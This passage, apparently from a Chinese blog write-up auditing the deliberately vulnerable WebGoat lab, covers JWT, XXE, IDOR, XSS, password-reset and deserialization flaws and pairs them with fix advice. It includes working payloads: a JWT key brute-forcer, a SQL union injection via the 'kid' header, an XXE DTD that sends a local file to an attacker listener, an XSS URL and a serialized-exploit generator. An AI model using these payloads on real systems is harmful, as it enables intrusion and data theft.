class=\"string\">&#x27;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTYxMTc5ODAxNSwiZXhwIjoxNjExNzk4MDc1LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.w1tzWDwmZcggbyV9ixcw1Vydf07MG9mAsPVbQPgBh2E&#x27;</span>    <span class=\"function\">with <span class=\"title\">open</span><span class=\"params\">(<span class=\"string\">&#x27;pass.txt&#x27;</span>)</span> as f:        <span class=\"keyword\">for</span> line in f:            key_ </span>= line.strip()            <span class=\"keyword\">try</span>:                jwt.decode(jwt_str, verify=True, key=key_, algorithms=<span class=\"string\">&quot;HS256&quot;</span>)                print(<span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27;\\bbingo! found key --&gt;&#x27;</span>, termcolor.colored(key_, <span class=\"string\">&#x27;green&#x27;</span>), <span class=\"string\">&#x27;&lt;--&#x27;</span>)                <span class=\"function\"><span class=\"keyword\">break</span>            <span class=\"title\">except</span> <span class=\"params\">(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError)</span>:                <span class=\"title\">print</span><span class=\"params\">(<span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27;\\bbingo! found key --&gt;&#x27;</span>, termcolor.colored(key_, <span class=\"string\">&#x27;green&#x27;</span>)</span>, &#x27;&lt;--&#x27;)                <span class=\"keyword\">break</span>            except jwt.exceptions.InvalidSignatureError:                <span class=\"title\">print</span><span class=\"params\">(<span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27; &#x27;</span> * <span class=\"number\">64</span>, <span class=\"string\">&#x27;\\r\\btry&#x27;</span>, key_, end=<span class=\"string\">&#x27;&#x27;</span>, flush=True)</span>                <span class=\"keyword\">continue</span>        <span class=\"keyword\">else</span>:            <span class=\"title\">print</span><span class=\"params\">(<span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27;\\bsorry! no key be found.&#x27;</span>)</span></span></span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p><img src=\"pt12.png\" alt=\"\"></p>\n<p>爆破出来 key，就可以去 https://jwt.io/#debugger 加工啦</p>\n<p><img src=\"pt13.png\" alt=\"\"></p>\n<p>jwt–&gt;JWTRefreshEndpoint</p>\n<p>登录时调用 createNewTokens ()</p>\n<p>会获取到的 refresh token 和该用户的 access token</p>\n<p>refresh token 是通过 RandomStringUtils.randomAlphabetic (20) 获取的随机值，用于刷新过期的 access token</p>\n<p>但是由于没有绑定用户信息，所以可以用来刷新任何任何用户的过期 token</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Map&lt;String, Object&gt; tokenJson = <span class=\"keyword\">new</span> HashMap&lt;&gt;();        String refreshToken = RandomStringUtils.randomAlphabetic(<span class=\"number\">20</span>);        validRefreshTokens.add(refreshToken);        tokenJson.put(<span class=\"string\">&quot;access_token&quot;</span>, token);        tokenJson.put(<span class=\"string\">&quot;refresh_token&quot;</span>, refreshToken);        <span class=\"keyword\">return</span> tokenJson;</span><br></pre></td></tr></table></figure>\n<p>token 刷新，请求包中的 refresh_token 被包含在随机生成的 token 集合中时，就返回一个新的 token：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (user == <span class=\"keyword\">null</span> || refreshToken == <span class=\"keyword\">null</span>) &#123;            <span class=\"keyword\">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validRefreshTokens.contains(refreshToken)) &#123;            validRefreshTokens.remove(refreshToken);            <span class=\"keyword\">return</span> ok(createNewTokens(user));        &#125; <span class=\"keyword\">else</span> &#123;            <span class=\"keyword\">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();        &#125;</span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p>利用登录接口，登录当前用户 jerry，获取刷新 refresh_token</p>\n<p><img src=\"pt14.png\" alt=\"\"></p>\n<p>没有成功刷新 token，报错信息：给出的 token 无法正常解析</p>\n<p>jwt–&gt;JWTFinalEndpoint.resetVotes()</p>\n<p>存在 sql 注入点 &quot;kid&quot;(KID 代表 “密钥序号”（Key ID）。它是 JWT 头部的一个可选字段，开发人员可以用它标识认证 token 的某一密钥)</p>\n<p>可以通过 union 进行绕过，将 &quot;key&quot; 作为认证密钥，使用<a href=\"https://jwt.io/#debugger\">在线工具</a>伪造 token</p>\n<p>这里将数据库取出的 key 用 base64 解码了，所以在注入的时候要注入 key 的 base 编码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aaa<span class=\"string\">&#x27; union select &#x27;</span>a2V5<span class=\"string\">&#x27; from jwt_keys where id=&#x27;</span>webgoat_key</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">final</span> String kid = (String) header.get(<span class=\"string\">&quot;kid&quot;</span>);                        <span class=\"keyword\">try</span> (<span class=\"keyword\">var</span> connection = dataSource.getConnection()) &#123;                            ResultSet rs = connection.createStatement().executeQuery(<span class=\"string\">&quot;SELECT key FROM jwt_keys WHERE id = &#x27;&quot;</span> + kid + <span class=\"string\">&quot;&#x27;&quot;</span>);                            <span class=\"keyword\">while</span> (rs.next()) &#123;                                <span class=\"keyword\">return</span> TextCodec.BASE64.decode(rs.getString(<span class=\"number\">1</span>));                            &#125;                        &#125;</span><br></pre></td></tr></table></figure>\n<p>建议</p>\n<ol>\n<li>保证密钥的保密性</li>\n<li>签名算法固定在后端，不以 JWT 里的算法为标准</li>\n<li>避免敏感信息保存在 JWT 中</li>\n<li>尽量 JWT 的有效时间足够短</li>\n<li>尽量避免用用户可以获取的参数刷新 token，避免逻辑绕过</li>\n<li>注意 header 部分，若有 sql 语句，建议使用预编译</li>\n</ol>\n<p>测试截图：</p>\n<p>a2v5 是 key 的 base64 编码</p>\n<p><img src=\"pt15.png\" alt=\"\"></p>\n<p><img src=\"pt16.png\" alt=\"\"></p>\n</li>\n<li>\n<p>安全问题</p>\n<p>password_reset–&gt;QuestionsAssignment</p>\n<p>密保问题设置为，你最喜欢的颜色是什么，可以直接用常见颜色生成字典进行爆破，建议使用更复杂的难以破解的问题，并且限制输入次数</p>\n<p><img src=\"ba01.png\" alt=\"\"></p>\n<p>测试截图：</p>\n<p><img src=\"pt17.png\" alt=\"\"></p>\n<p>password_reset–&gt;ResetLinkAssignmentForgotPassword</p>\n<p>参数 host 是从 Request 头部获取的，可以通过控制 host 参数，给用户发送一个我们控制的 link，用户点击后访问我们的服务器，服务器记录该请求，从而获取到后面的 resetLink，然后我们再通过正常的访问修改密码</p>\n</li>\n</ol>\n<p>修复建议：</p>\n<pre><code>1. 禁止将用户可控的参数拼接进密码重置link2. 重置链接应该是一次性有效的\n</code></pre>\n   <figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">fakeClickingLinkEmail</span><span class=\"params\">(String host, String resetLink)</span> </span>&#123;        <span class=\"keyword\">try</span> &#123;            HttpHeaders httpHeaders = <span class=\"keyword\">new</span> HttpHeaders();            HttpEntity httpEntity = <span class=\"keyword\">new</span> HttpEntity(httpHeaders);            <span class=\"keyword\">new</span> RestTemplate().exchange(String.format(<span class=\"string\">&quot;http://%s/PasswordReset/reset/reset-password/%s&quot;</span>, host, resetLink), HttpMethod.GET, httpEntity, Void.class);        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;         <span class=\"comment\">//don&#x27;t care        &#125;    &#125;</span></span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p>攻击者服务器记录了请求</p>\n<p><img src=\"pt18.png\" alt=\"\"></p>\n<h1 id=\"用户敏感信息传输与存储\"><a class=\"markdownIt-Anchor\" href=\"#用户敏感信息传输与存储\">#</a> 用户敏感信息传输与存储</h1>\n<h2 id=\"漏洞描述-5\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-5\">#</a> 漏洞描述</h2>\n<p>系统未对用户的敏感信息（如密码、身份证号、电话号码、银行卡号等）进行加密、脱敏等操作，导致用户信息存在泄露的风险。</p>\n<h2 id=\"漏洞成因-5\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因-5\">#</a> 漏洞成因</h2>\n<p>提交登录请求时，没有对密码进行加密</p>\n<h2 id=\"代码片段以及修复建议-5\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议-5\">#</a> 代码片段以及修复建议</h2>\n<p>前端存储的用户名和密码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">submit_secret_credentials</span>(<span class=\"params\"></span>) </span>&#123;    <span class=\"keyword\">var</span> xhttp = <span class=\"keyword\">new</span> XMLHttpRequest();    xhttp[<span class=\"string\">&#x27;open&#x27;</span>](<span class=\"string\">&#x27;POST&#x27;</span>, <span class=\"string\">&#x27;#attack/307/100&#x27;</span>, <span class=\"literal\">true</span>);\t<span class=\"comment\">//sending the request is obfuscated, to descourage js reading\tvar _0xb7f9=[&quot;\\x43\\x61\\x70\\x74\\x61\\x69\\x6E\\x4A\\x61\\x63\\x6B&quot;,&quot;\\x42\\x6C\\x61\\x63\\x6B\\x50\\x65\\x61\\x72\\x6C&quot;,&quot;\\x73\\x74\\x72\\x69\\x6E\\x67\\x69\\x66\\x79&quot;,&quot;\\x73\\x65\\x6E\\x64&quot;];xhttp[_0xb7f9[3]](JSON[_0xb7f9[2]](&#123;username:_0xb7f9[0],password:_0xb7f9[1]&#125;))&#125;</span></span><br></pre></td></tr></table></figure>\n<p>调用该函数的发包截图：</p>\n<p><img src=\"se01.png\" alt=\"\"></p>\n<p>建议在数据传过程中，对用户的敏感数据进行加密</p>\n<h1 id=\"xml外部实体注入\"><a class=\"markdownIt-Anchor\" href=\"#xml外部实体注入\">#</a> XML 外部实体注入</h1>\n<h2 id=\"漏洞描述-6\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-6\">#</a> 漏洞描述</h2>\n<p>XXE（XML External Entity Injection）是一种针对 XML 终端实施的攻击，漏洞产生的根本原因就是在 XML1.0 标准中引入了 “entity” 这个概念，且 “entity” 可以在预定义的文档中进行调用，XXE 漏洞的利用就是通过实体的标识符访问本地或者远程内容。黑客想要实施这种攻击，需要在 XML 的 payload 包含外部实体声明，且服务器本身允许实体扩展。这样的话，黑客或许能读取 WEB 服务器的文件系统，通过 UNC 路径访问远程文件系统，或者通过 HTTP/HTTPS 连接到任意主机。</p>\n<h2 id=\"漏洞成因-6\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因-6\">#</a> 漏洞成因</h2>\n<p>XML 解析没有禁止外部实体的解析，且用户可控 REST XML 格式的参数。</p>\n<h2 id=\"代码片段以及修复建议-6\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议-6\">#</a> 代码片段以及修复建议</h2>\n<ol>\n<li>\n<p>xxe–&gt;SimpleXXE.createNewComment()</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">boolean</span> secure = <span class=\"keyword\">false</span>;     \t<span class=\"keyword\">if</span> (<span class=\"keyword\">null</span> != request.getSession().getAttribute(<span class=\"string\">&quot;applySecurity&quot;</span>)) &#123;     \t\tsecure = <span class=\"keyword\">true</span>;     \t&#125;         Comment comment = comments.parseXml(commentStr, secure);         comments.addComment(comment, <span class=\"keyword\">false</span>);         <span class=\"keyword\">if</span> (checkSolution(comment)) &#123;             <span class=\"keyword\">return</span> success(<span class=\"keyword\">this</span>).build();         &#125;</span><br></pre></td></tr></table></figure>\n<p>其中调用 Comment 的 parseXml (commentStr, secure) 方法进行 xml 解析<br>\n正如代码中所示，可以通过设置 XMLConstants 的两个属性来禁用外部实体解析，默认的空字符串就是禁用，也可以指定协议等。</p>\n</li>\n</ol>\n<p>详细信息可以看 XMLConstants 中的注释。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> jc = JAXBContext.newInstance(Comment.class);     <span class=\"keyword\">var</span> xif = XMLInputFactory.newInstance();   <span class=\"keyword\">if</span> (secure) &#123;        \txif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class=\"string\">&quot;&quot;</span>); <span class=\"comment\">// Compliant     \txif.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);  // compliant        &#125;                   var xsr = xif.createXMLStreamReader(new StringReader(xml));            var unmarshaller = jc.createUnmarshaller();        return (Comment) unmarshaller.unmarshal(xsr);</span></span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p><img src=\"xxe01.png\" alt=\"\"></p>\n<ol start=\"2\">\n<li>\n<p>xxe–&gt;ContentTypeAssignment.createNewUser()</p>\n<p>根据 contentType 判断数据格式，xml 解析和 1 一样，其余同上</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 如果是xml格式        if (null != contentType &amp;&amp; contentType.contains(MediaType.APPLICATION_XML_VALUE)) &#123;            String error = &quot;&quot;;            try &#123;            \tboolean secure = false;            \tif (null != request.getSession().getAttribute(&quot;applySecurity&quot;)) &#123;            \t\tsecure = true;            \t&#125;                Comment comment = comments.parseXml(commentStr, secure);                comments.addComment(comment, false);                if (checkSolution(comment)) &#123;                    attackResult = success(this).build();                &#125;            &#125;</span></span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p><img src=\"xxe02.png\" alt=\"\"></p>\n<p><img src=\"xxe03.png\" alt=\"\"></p>\n</li>\n<li>\n<p>xxe–&gt;ContentTypeAssignment.addComment()</p>\n<p>这里作者为了弄一个 blind xxe，特别设置了提交正确的内容才返回 success</p>\n<p>xml 解析代码并没有改变</p>\n<p>实际上还是通过参数实体注入（参数实体也能被外部引用），为了看到数据所以要通过盲打的方式，将 WEB 服务器的本地文件内容发送到攻击者的服务器</p>\n<p>修复建议同上</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//Solution is posted as a separate comment        if (commentStr.contains(CONTENTS)) &#123;            return success(this).build();        &#125;        try &#123;        \tboolean secure = false;        \tif (null != request.getSession().getAttribute(&quot;applySecurity&quot;)) &#123;        \t\tsecure = true;        \t&#125;            Comment comment = comments.parseXml(commentStr, secure);            if (CONTENTS.contains(comment.getText())) &#123;                comment.setText(&quot;Nice try, you need to send the file to WebWolf&quot;);            &#125;            comments.addComment(comment, false);        &#125;</span></span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p>a.dtd 上传在攻击服务器上</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % payload  &quot;&lt;!ENTITY attack SYSTEM &#x27;http://127.0.0.1:9090/landing?text=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"xxe04.png\" alt=\"\"></p>\n<p>数据通过实体引用成功回显啦</p>\n<p><img src=\"xxe05.png\" alt=\"\"></p>\n</li>\n</ol>\n<h1 id=\"水平越权\"><a class=\"markdownIt-Anchor\" href=\"#水平越权\">#</a> 水平越权</h1>\n<h2 id=\"漏洞描述-7\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-7\">#</a> 漏洞描述</h2>\n<p>水平越权漏洞，是一种 “基于数据的访问控制” 设计缺陷引起的漏洞。由于服务器端在接收到请求数据进行操作时，没有判断数据的所属人，而导致的越权数据访问漏洞。如服务器端从客户端提交的 request 参数（用户可控数据）中获取用户 id，恶意攻击者通过变换请求 ID 的值，查看或修改不属于本人的数据。</p>\n<h2 id=\"漏洞成因-7\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因-7\">#</a> 漏洞成因</h2>\n<p>服务器端对数据的访问控制验证不充分</p>\n<h2 id=\"代码片段以及修复建议-7\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议-7\">#</a> 代码片段以及修复建议</h2>\n<p>idor–&gt;IDORViewOtherProfile</p>\n<p>安全代码将确保在拆除所请求的配置文件之前确保有一个水平访问控制检查</p>\n<p>例如检查登录用户的 session 中的 id（用户不可控）是否和请求的 id 一致</p>\n<p>if(requestedProfile.getUserId().equals(authUserId))</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (userSessionData.getValue(<span class=\"string\">&quot;idor-authenticated-as&quot;</span>).equals(<span class=\"string\">&quot;tom&quot;</span>)) &#123;            <span class=\"comment\">//going to use session auth to view this one            String authUserId = (String) userSessionData.getValue(&quot;idor-authenticated-user-id&quot;);            if (userId != null &amp;&amp; !userId.equals(authUserId)) &#123;                //on the right track                UserProfile requestedProfile = new UserProfile(userId);                // secure code would ensure there was a horizontal access control check prior to dishing up the requested profile                 if (requestedProfile.getUserId().equals(&quot;2342388&quot;)) &#123;                    return success(this).feedback(&quot;idor.view.profile.success&quot;).output(requestedProfile.profileToMap().toString()).build();                &#125; else &#123;                    return failed(this).feedback(&quot;idor.view.profile.close1&quot;).build();                &#125;</span></span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p><img src=\"yq01.png\" alt=\"\"></p>\n<h1 id=\"xss跨站脚本\"><a class=\"markdownIt-Anchor\" href=\"#xss跨站脚本\">#</a> XSS 跨站脚本</h1>\n<h2 id=\"漏洞描述-8\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-8\">#</a> 漏洞描述</h2>\n<p>跨站脚本攻击（Cross Site Script）是一种将恶意 JavaScript 代码插入到其他 Web 用户页面里执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在 HTML 页面里嵌入恶意代码。当用户浏览该页时，这些嵌入在 HTML 中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如 cookie 窃取、帐户劫持、拒绝服务攻击等。</p>\n<p>跨站脚本攻击有以下攻击形式：</p>\n<p>1、反射型跨站脚本攻击</p>\n<p>攻击者利用社会工程学等手段，发送一个 URL 链接给用户打开，在用户打开页面的同时，浏览器会执行页面中嵌入的恶意脚本。</p>\n<p>2、存储型跨站脚本攻击</p>\n<p>攻击者利用应用程序提供的录入或修改数据的功能，将数据存储到服务器或用户 cookie 中，当其他用户浏览展示该数据的页面时，浏览器会执行页面中嵌入的恶意脚本，所有浏览者都会受到攻击。</p>\n<p>3、DOM 跨站脚本攻击</p>\n<p>由于 HTML 页面中，定义了一段 JS，根据用户的输入，显示一段 HTML 代码，攻击者可以在输入时，插入一段恶意脚本，最终展示时，会执行恶意脚本。</p>\n<p>DOM 跨站脚本攻击和以上两个跨站脚本攻击的区别是，DOM 跨站是纯页面脚本的输出，只有规范使用 JavaScript，才可以防御。</p>\n<h2 id=\"漏洞成因-8\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因-8\">#</a> 漏洞成因</h2>\n<p>在 HTML 中常用到字符实体，将常用到的字符实体没有进行转译，导致完整的标签出现，在可输入的文本框等某些区域内输入特定的某些标签导致代码被恶意篡改。</p>\n<h2 id=\"代码片段以及修复建议-8\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议-8\">#</a> 代码片段以及修复建议</h2>\n<ol>\n<li>\n<p>xss–&gt;CrossSiteScriptingLesson5a</p>\n<p>反射型 xss</p>\n<p>题目用正则表达式匹配用户输入的参数 field1，因为是题目需求这里匹配 &quot;.*&lt;script&gt;(console\\.log|alert)\\(.<em>\\);?&lt;\\/script&gt;.</em>&quot; 后在页面上进行输出</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> Predicate&lt;String&gt; XSS_PATTERN = Pattern.compile(            <span class=\"string\">&quot;.*&lt;script&gt;(console\\\\.log|alert)\\\\(.*\\\\);?&lt;\\\\/script&gt;.*&quot;</span>            , Pattern.CASE_INSENSITIVE).asMatchPredicate();<span class=\"keyword\">if</span> (XSS_PATTERN.test(field1)) &#123;            userSessionData.setValue(<span class=\"string\">&quot;xss-reflected-5a-complete&quot;</span>, <span class=\"string\">&quot;true&quot;</span>);            <span class=\"keyword\">if</span> (field1.toLowerCase().contains(<span class=\"string\">&quot;console.log&quot;</span>)) &#123;                <span class=\"keyword\">return</span> success(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;xss-reflected-5a-success-console&quot;</span>).output(cart.toString()).build();            &#125; <span class=\"keyword\">else</span> &#123;                <span class=\"keyword\">return</span> success(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;xss-reflected-5a-success-alert&quot;</span>).output(cart.toString()).build();            &#125;        &#125;</span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p><img src=\"xss02.png\" alt=\"\"></p>\n<p>修复建议：</p>\n<ol>\n<li>\n<p>根据要在何处使用用户输入，使用适当的转义 / 编码技术：HTML 转义，JavaScript 转义，CSS 转义，URL 转义等。使用现有的转义库，除非绝对必要，否则请不要编写自己的库。</p>\n</li>\n<li>\n<p>如果用户输入需要包含 HTML，则无法对其进行转义 / 编码，因为它会破坏有效的标签。在这种情况下，请使用受信任且经过验证的库来解析和清除 HTML。</p>\n</li>\n<li>\n<p>为 cookie 设置 HttpOnly 标志</p>\n</li>\n<li>\n<p>使用内容安全策略</p>\n</li>\n</ol>\n</li>\n<li>\n<p>DOM 型</p>\n<p>源码中使用路由，路由中的参数而无需编码可以执行 WebGoat 中的内部功能</p>\n<p><img src=\"xss01.png\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// something like ... http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&amp;_someVar=234902384lotslsfjdOf9889080GarbageHere%3Cscript%3Ewebgoat.customjs.phoneHome();%3C%2Fscript%3E--andMoreGarbageHere// or http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&amp;_someVar=234902384lotslsfjdOf9889080GarbageHere&lt;script&gt;webgoat.customjs.phoneHome();&lt;%2Fscript&gt;</span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p>通过 url 触发路由内部函数的执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&amp;_someVar=234902384lotslsfjdOf9889080GarbageHere&lt;script&gt;webgoat.customjs.phoneHome();&lt;%2Fscript&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"xss03.png\" alt=\"\"></p>\n<p>修复建议：规范使用 JavaScript</p>\n</li>\n</ol>\n<h1 id=\"反序列化\"><a class=\"markdownIt-Anchor\" href=\"#反序列化\">#</a> 反序列化</h1>\n<p>反序列化漏洞呢是一个说复杂也不复杂，说不复杂也很复杂的问题，要理解的点还是有很多的，<a href=\"https://www.cnblogs.com/ssooking/p/5875215.html\">这里就讲的很细</a></p>\n<p>deserialization–&gt;InsecureDeserializationTask</p>\n<p>根据 if (!(o instanceof VulnerableTaskHolder))，可以发现，我们序列化的实例应该是 VulnerableTaskHolder</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span> (ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(<span class=\"keyword\">new</span> ByteArrayInputStream(Base64.getDecoder().decode(b64token)))) &#123;            before = System.currentTimeMillis();            Object o = ois.readObject();            <span class=\"keyword\">if</span> (!(o <span class=\"keyword\">instanceof</span> VulnerableTaskHolder)) &#123;                <span class=\"keyword\">if</span> (o <span class=\"keyword\">instanceof</span> String) &#123;                    <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;insecure-deserialization.stringobject&quot;</span>).build();                &#125;                <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;insecure-deserialization.wrongobject&quot;</span>).build();            &#125;            after = System.currentTimeMillis();</span><br></pre></td></tr></table></figure>\n<p>VulnerableTaskHolder 定位到 Runtime.getRuntime ().exec (taskAction)</p>\n<p>并且 taskAction 是在构造函数里被赋值的</p>\n<p>所以我们可以通过控制 taskAction 来控制执行的命令（eg. VulnerableTaskHolder go = new VulnerableTaskHolder (“sleep”, “sleep 6”)），将对象使用序列化工具序列化，提交至后端处理，就会触发</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//condition is here to prevent you from destroying the goat altogether\t\tif ((taskAction.startsWith(&quot;sleep&quot;)||taskAction.startsWith(&quot;ping&quot;))\t\t\t\t&amp;&amp; taskAction.length() &lt; 22) &#123;\t\tlog.info(&quot;about to execute: &#123;&#125;&quot;, taskAction);\t\ttry &#123;            Process p = Runtime.getRuntime().exec(taskAction);            BufferedReader in = new BufferedReader(                                new InputStreamReader(p.getInputStream()));            String line = null;            while ((line = in.readLine()) != null) &#123;                log.info(line);            &#125;        &#125;</span></span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p>序列化 VulnerableTaskHolder 对象，base64 编码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;        <span class=\"keyword\">try</span>&#123;            VulnerableTaskHolder go = <span class=\"keyword\">new</span> VulnerableTaskHolder(<span class=\"string\">&quot;sleep&quot;</span>, <span class=\"string\">&quot;sleep 6&quot;</span>);            ByteArrayOutputStream bos = <span class=\"keyword\">new</span> ByteArrayOutputStream();            ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(bos);            oos.writeObject(go);            oos.flush();            <span class=\"keyword\">byte</span>[] exploit = bos.toByteArray();            String exp = Base64.getEncoder().encodeToString(exploit);            System.out.println(exp);        &#125; <span class=\"keyword\">catch</span> (Exception e)&#123;        &#125;</span><br></pre></td></tr></table></figure>\n<p>提交后反序列化后的对象</p>\n<p><img src=\"des01.png\" alt=\"\"></p>\n<p>但是没有执行成功，谷歌了一下，说是用 java 调用 CMD 命令时，需要指定 ，但是这个会改变现存代码逻辑，暂未实现，实现后再更新</p>\n<p><img src=\"des02.png\" alt=\"\"></p>\n<p>反序列化漏洞修复建议：</p>\n<pre><code>1. 如果是第三方组件存在反序列化漏洞，建议更新版本或打补丁2. 加强对Runtime.exec相关代码的检测3. 条件允许的话，禁止JVM执行外部命令\n</code></pre>\n<h1 id=\"第三方组件\"><a class=\"markdownIt-Anchor\" href=\"#第三方组件\">#</a> 第三方组件</h1>\n<h2 id=\"漏洞描述-9\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-9\">#</a> 漏洞描述</h2>\n<p>系统中引用了存在已知漏洞的第三方组件，如 Jackson 反序列化漏洞、Struts2 远程代码执行漏洞等，可能会直接或间接导致系统沦陷。</p>\n<h2 id=\"代码片段以及修复建议-9\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议-9\">#</a> 代码片段以及修复建议</h2>\n<p><a href=\"https://x-stream.github.io/CVE-2013-7285.html\">CVE-2013-7285 漏洞详情</a></p>\n<p>攻击者可以通过版本信息找到相应的 cve 漏洞和 payload 进行利用，如下就是通过构造 ContactImpl 的 xml 格式通关。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span> &#123;        \t<span class=\"keyword\">if</span> (!StringUtils.isEmpty(payload)) &#123;        \t\tpayload = payload.replace(<span class=\"string\">&quot;+&quot;</span>, <span class=\"string\">&quot;&quot;</span>).replace(<span class=\"string\">&quot;\\r&quot;</span>, <span class=\"string\">&quot;&quot;</span>).replace(<span class=\"string\">&quot;\\n&quot;</span>, <span 